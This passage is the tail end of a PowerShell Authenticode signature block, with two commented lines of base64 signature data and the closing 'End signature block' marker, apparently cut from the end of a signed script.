# 3NUra2tTZn/boyyCa/o9SIAUUdEuKorabVMk/h3FX5lRHsBa0uQ6kRIEkeuaKXZp
# kas7MZwnFE1Jti+KVzNl/Xhfit2ZFLnO0UAQSYuRi7W2Cg==
# SIG # End signature block
